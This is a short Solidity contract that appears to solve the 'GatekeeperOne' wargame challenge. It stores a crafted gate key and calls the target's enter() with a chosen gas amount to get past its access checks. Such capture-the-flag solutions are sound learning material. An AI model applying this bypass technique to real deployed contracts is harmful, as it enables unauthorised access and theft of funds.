// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperOne.sol';

contract GatekeeperOneHack {
    bytes8 public s_gateKey;
    GatekeeperOne public gatekeeperOne;

    constructor(bytes8 _gateKey, address _addrGatekeeperOne) {
        s_gateKey = bytes8(_gateKey);
        gatekeeperOne = GatekeeperOne(_addrGatekeeperOne);
    }

    function attack(uint256 gasToUse) external {
        gatekeeperOne.enter{gas: gasToUse}(s_gateKey);
    }
}
